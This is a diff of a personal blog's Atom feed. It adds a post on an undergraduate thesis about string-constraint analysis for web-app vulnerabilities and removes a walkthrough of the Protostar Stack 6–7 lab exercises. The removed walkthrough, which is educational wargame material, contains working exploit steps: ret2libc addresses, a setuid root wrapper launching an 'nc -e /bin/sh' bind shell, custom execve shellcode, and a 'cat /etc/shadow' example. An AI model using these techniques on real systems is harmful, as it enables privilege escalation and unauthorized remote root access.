@@ -4,7 +4,7 @@
   <title><![CDATA[Category: projects | Louis Li]]></title>
   <link href="http://louisrli.github.io/blog/categories/projects/atom.xml" rel="self"/>
   <link href="http://louisrli.github.io/"/>
-  <updated>2015-02-05T20:27:37-05:00</updated>
+  <updated>2015-05-07T08:38:44-04:00</updated>
   <id>http://louisrli.github.io/</id>
   <author>
     <name><![CDATA[Louis Li]]></name>
@@ -12,6 +12,38 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Senior Thesis: Security Analysis of Java Web Applications Using String Constraint Analysis]]></title>
+    <link href="http://louisrli.github.io/blog/2015/05/03/senior-thesis/"/>
+    <updated>2015-05-03 00:00:00 -0400</updated>
+    <id>http://louisrli.github.io/blog/2015/05/03/senior-thesis</id>
+    <content type="html"><![CDATA[<p>I submitted my undergraduate thesis at the beginning of April, titled “Security Analysis of Java Web
+Applications Using String Constraint Analysis.” I was advised by Professor Stephen Chong.</p>
+
+<!-- more -->
+
+<p>Here’s the abstract:</p>
+
+<blockquote>
+
+  <p>Web applications are exposed to myriad security vulnerabilities related to malicious user string
+input. In order to detect such vulnerabilities in Java web applications, this project employs string
+constraint analysis, which approximates the values that a string variable in a program can take on.
+In string constraint analysis, program analysis generates string constraints – assertions about the
+relationships between string variables. We design and implement a dataflow analysis for Java
+programs that generates string constraints and passes those constraints to the CVC4 SMT solver to
+find a satisfying assignment of string variables. Using example programs, we illustrate the
+feasibility of the system in detecting certain types of web application vulnerabilities, such as SQL
+injection and cross-site scripting.</p>
+</blockquote>
+
+<p><a href="/downloads/louisli-thesis.pdf">Download the PDF</a> or view it below. </p>
+
+<embed src="/downloads/louisli-thesis.pdf" type="application/pdf" width="100%" height="600" />
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Erasable Code Contracts]]></title>
@@ -341,207 +373,6 @@ ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
 <span class="go">&lt;lots of=&quot;&quot; whitespace=&quot;&quot;&gt;</span>
 <span class="go">512</span>
 <span class="go">                                                                                                                                                                              code execution redirected! you win</span></code></pre></div></lots></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 6-7)]]></title>
-    <link href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/"/>
-    <updated>2012-08-28 00:00:00 -0400</updated>
-    <id>http://louisrli.github.io/blog/2012/08/28/protostar-stack2</id>
-    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
-<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
-
-<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the final post for Stack.</p>
-
-<h1 id="solutions">Solutions</h1>
-<p>## Stack 6
-<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack6">full</a>): Execute shellcode with a restriction on the return address. This mimics a nonexecutable stack by barring any return addresses of the form <code>0xbfxxxxxx</code>.</p>
-
-<h3 id="utilities">Utilities</h3>
-<p>We’ll add one more script to our utility belt. This will help us quickly make guesses for buffer overflows.</p>
-
-<p><code>~/try-address.sh</code>:
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
-<span class="c"># Takes an offset and unlimited 4-byte addresses and prints it in little-endian order</span>
-<span class="k">if</span> <span class="o">[[</span> <span class="nv">$# </span>-lt <span class="m">2</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
-    <span class="nb">echo</span> “usage: <span class="nv">$0</span> OFFSET ADDRESS. Example: <span class="nv">$0</span> <span class="m">80</span> 0xdeadbeef 0xf00f00f0”
-    <span class="nb">exit </span>1
-<span class="k">fi</span>&lt;/p&gt;
-
-&lt;p&gt;perl -e “print ‘A’x<span class="nv">$1</span>”
-<span class="nb">shift</span>
-<span class="k">for</span> addr in <span class="nv">$@</span><span class="p">;</span> <span class="k">do</span>
-    <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">8</span> -2 2<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -ne “<span class="se">\x</span><span class="k">${</span><span class="nv">addr</span><span class="p">:</span><span class="nv">$i</span><span class="p">:</span><span class="nv">2</span><span class="k">}</span>”<span class="p">;</span> <span class="k">done</span>
-<span class="k">done</span></code></pre></div></p>
-
-<!-- more -->
-<p>### Solution
-First, we need to find the proper offset for overwriting the return address. The command below reveals that the return address is 16 bytes after the end of the 64 byte buffer, meaning that 80 bytes are needed before overwriting the return address.</p>
-
-<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">76</span> <span class="m">4</span> 100<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> ~/try-address.sh <span class="nv">$i</span> 0xbfffffff <span class="p">|</span> ./stack6<span class="p">;</span> <span class="k">done</span>
-<span class="go">76</span>
-<span class="go">…</span>
-<span class="go">80</span>
-<span class="go">input path please: bzzzt (0xbfffffff)</span>
-<span class="go">84</span>
-<span class="go">…</span></code></pre></div></p>
-
-<p>For our solution, we’ll be performing a <strong><a href="http://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a></strong> attack. <a href="http://shellblade.net/docs/ret2libc.pdf">This paper</a> by InVoLuNTaRy offers an in-depth description of the tactic (sidenote: it’s one of the most well-written papers that I’ve ever read and well worth the read). The rest of this section assumes that this paper has been read.</p>
-
-<p>First, we find the addresses of the <code>system()</code> and <code>exit()</code> libc functions. <code>exit()</code> isn’t strictly necessary, but since ret2libc ultimately calls two functions, we prefer to return without a segmentation fault.
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gdb -q stack6
-<span class="go">Reading symbols from /opt/protostar/bin/stack6…done.</span>
-<span class="go">(gdb) break main</span>
-<span class="go">Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.</span>
-<span class="go">(gdb) run</span>
-<span class="go">Starting program: /opt/protostar/bin/stack6&lt;/p&gt;</span>
-
-<span class="go">&lt;p&gt;Breakpoint 1, main (argc=1, argv=0xbffff874) at stack6/stack6.c:27</span>
-<span class="go">27      stack6/stack6.c: No such file or directory.</span>
-<span class="go">in stack6/stack6.c</span>
-<span class="go">(gdb) print system</span>
-<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">{</span><span class="p">&amp;</span>lt<span class="p">;</span>text variable, no debug info<span class="p">&amp;</span>gt<span class="p">;</span><span class="o">}</span> 0xb7ecefb0 &lt;__libc_system&gt;
-<span class="go">(gdb) print exit</span>
-<span class="gp">$</span><span class="nv">2</span> <span class="o">=</span> <span class="o">{</span><span class="p">&amp;</span>lt<span class="p">;</span>text variable, no debug info<span class="p">&amp;</span>gt<span class="p">;</span><span class="o">}</span> 0xb7ec50c0 <span class="p">&amp;</span>lt<span class="p">;</span>*__GI_exit<span class="p">&amp;</span>gt<span class="p">;</span></code></pre></div></__libc_system></p>
-
-<p>We see that our functions have the following addresses:</p>
-
-<ul>
-  <li><code>system()</code>: <code>0xb7ecefb0</code></li>
-  <li><code>exit()</code>: <code>0xb7ec50c0</code></li>
-</ul>
-
-<p>Given the particular stack layout for a ret2libc attack (described in the InVoLuNTaRy paper), our solution will be of the form:
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ~/try-address.sh <span class="m">80</span> <span class="o">(</span>ENV_VAR_ADDRESS<span class="o">)</span> <span class="o">(</span>EXIT<span class="o">()</span>_ADDRESS<span class="o">)</span> <span class="o">(</span>SYSTEM<span class="o">()</span>_ADDRESS<span class="o">)</span></code></pre></div></p>
-
-<h4 id="sanity-checks">Sanity checks</h4>
-<p>First, let’s make sure that we can actually execute code.
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">TEST</span><span class="o">=</span>whoami
-<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff8a <span class="p">|</span> ./stack6
-<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췊���</span>
-<span class="go">sh: =whoami: not found</span>
-<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff8b <span class="p">|</span> ./stack6
-<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췋���</span>
-<span class="go">root</span></code></pre></div></p>
-
-<h4 id="working-netcat-solution">Working netcat solution</h4>
-<p>There are two obstacles to a working solution.</p>
-
-<ol>
-  <li>Environmental variables with spaces don’t work. All of the following would fail:
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>”nc -lp8080 -e/bin/sh”
-<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>”cat /etc/shadow”
-<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>”<span class="s2">&quot;cat /etc/shadow&quot;</span>”</code></pre></div></li>
-  <li><code>system()</code> will drop our root privileges (<a href="http://linux.die.net/man/3/system">man system</a>)</li>
-</ol>
-
-<p>Instead, we can wrap our call to netcat in another C program, naming an executable without spaces and restoring our privileges.</p>
-
-<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdlib.h&gt;&lt;/stdlib.h&gt;&lt;/p&gt;</span>
-
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// These two are necessary, as system() drops privileges</span>
-    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-    <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>  <span class="err">“</span><span class="n">nc</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="o">-</span><span class="n">lp8080</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="o">-</span><span class="n">e</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">”</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span> <span class="p">};</span>
-    <span class="n">execve</span><span class="p">(</span><span class="err">“</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">nc</span><span class="err">”</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
-<span class="p">}</span></code></pre></div></p>
-
-<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gcc ~/netcat.c -o ~/netcat
-<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>/////////////////////////////////////home/user/netcat   <span class="c"># The slashes are similar to a NOP sled</span>
-<span class="gp">$</span> ~/envaddr RUN
-<span class="go">RUN is at address 0xbfffff9e</span>
-<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff9e <span class="p">|</span> ./stack6
-<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췞���</span>
-<span class="go">sh: 192.168.1.10: not found</span></code></pre></div></p>
-
-<p><code>system()</code> doesn’t seem to be using the contents of our environmental variable. If we look at the environmental variables, though, we see that we were close enough: <code>RUN</code> is the next variable. We then adjust our estimate for the address of <code>RUN</code> by 20 bytes.</p>
-
-<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> env
-<span class="go">…</span>
-<span class="go">HOME=/home/user</span>
-<span class="go">LOGNAME=user</span>
-<span class="go">SSH_CONNECTION=192.168.1.7 49324 192.168.1.10 22</span>
-<span class="go">RUN=/////////////////////////////////////home/user/netcat</span>
-<span class="go">_=/usr/bin/env</span>
-<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffffbe <span class="p">|</span> ./stack6
-<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췳���&lt;/p&gt;</span>
-<span class="go">&lt;waiting&gt;</span></code></pre></div>
-
-Finally, through a remote machine:
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080
-<span class="go">whoami</span>
-<span class="go">root</span></code></pre></div>
-
-## Stack: Level 7
-**Description** ([full](http://exploit-exercises.com/protostar/stack7)): Execute shellcode with further restrictions on the return address. Any address of the form `0xbxxxxxxx` raises an error.
-
-### Overview
-
-The return value of a function is usually stored in the `eax` register. The key to this level is the call to `return strdup(buf)`: this means we can find the buffer (e.g. our shellcode) in the `eax` register when `getpath()` returns.
-
-The code restricts us from returning to any code on the bottom of the stack (`0xbxxxxxxx`) and advises us to return to the `.text` section. In particular, we&#8217;ll want to return to a `call eax` instruction, which will then call our shellcode.
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -M intel -d stack7 <span class="p">|</span> grep <span class="s2">&quot;call.*eax&quot;</span>
-<span class="go">8048478:       ff 14 85 5c 96 04 08    call   DWORD PTR [eax*4+0x804965c]</span>
-<span class="go">80484bf:       ff d0                   call   eax</span>
-<span class="go">80485eb:       ff d0                   call   eax</span></code></pre></div>
-
-If we play with the numbers like in earlier levels, we&#8217;ll find that 80 bytes are needed before the return address. Our buffer overflow will look like this:
-<div class="highlight"><pre><code class="language-text" data-lang="text">Buffer start
-      | ---------- Shellcode (n bytes) --------- |
-      | -------- Padding (80 - n bytes) -------- |
-      | -- Return address 0x80484bf (4 bytes) -- |
-Buffer end (84 bytes total)</code></pre></div>
-
-### Solution
-In earlier levels, we found that opening a shell with `gets()`. However, we can still use it to validate our strategy:
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/shell<span class="k">)$(</span>~/try-address.sh <span class="m">49</span> 0x080484bf<span class="k">)</span> <span class="p">|</span> wc -c
-<span class="go">84</span>
-<span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/shell<span class="k">)$(</span>~/try-address.sh <span class="m">49</span> 0x080484bf<span class="k">)</span> <span class="p">&amp;</span>gt<span class="p">;</span> /tmp/stack7shell
-<span class="gp">$</span> gdb -q stack7
-<span class="go">Reading symbols from /opt/protostar/bin/stack7...done.</span>
-<span class="go">(gdb) run &amp;lt; /tmp/stack7shell</span>
-<span class="go">Starting program: /opt/protostar/bin/stack7 &amp;lt; /tmp/stack7shell</span>
-<span class="go">input path please: got path ����1�Ph//shh/bin��h-ilsP�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��</span>
-<span class="go">Executing new program: /bin/dash</span>
-
-<span class="go">Program exited normally.</span></code></pre></div>
-
-If we give it a shot with our `nc` shellcode, we&#8217;ll find the following error: `bin/sh: forward host lookup failed: Unknown host`. This occurs as a complication from having options passed into the `execve` call.
-
-We can add another wrapper to the `netcat.c` used in Level 6 by writing our own shellcode. This shellcode will simply execute `/tmp/nc`, an alias for a compiled `netcat.c`. This file, in turn, calls netcat and listens via port 8080.
-
-`~/sc-tmp-nc.asm`:
-<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">BITS</span> <span class="mi">32</span>
-
-<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
-<span class="nf">push</span> <span class="nb">eax</span>
-<span class="nf">push</span> <span class="mh">0x636e2f2f</span>         <span class="c1">; //nc</span>
-<span class="nf">push</span> <span class="mh">0x706d742f</span>         <span class="c1">; /tmp</span>
-<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
-<span class="nf">push</span> <span class="nb">eax</span>
-<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
-<span class="nf">push</span> <span class="nb">ebx</span>
-<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
-<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>              <span class="c1">; execve()</span>
-<span class="nf">int</span> <span class="mh">0x80</span></code></pre></div>
-
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> nasm ~/sc-tmp-nc.asm
-<span class="gp">$</span> gcc ~/netcat.c -o ~/netcat
-<span class="gp">$</span> cp /home/user/netcat /tmp/nc
-<span class="gp">$</span> cat /home/user/sc-tmp-nc <span class="p">|</span> wc -c
-<span class="go">25</span>
-<span class="go">got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��</span>
-<span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/sc-tmp-nc<span class="k">)$(</span>~/try-address.sh <span class="m">55</span> 0x080484bf<span class="k">)</span> <span class="p">|</span> ./stack7
-<span class="go">input path please: got path 1�Ph//nch/tmp���̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��</span>
-<span class="go">&lt;waiting&gt;</span></code></pre></div>
-
-On a remote machine:
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080
-<span class="go">whoami</span>
-<span class="go">root</span></code></pre></div>
-</waiting></waiting>
 ]]></content>
   </entry>
   
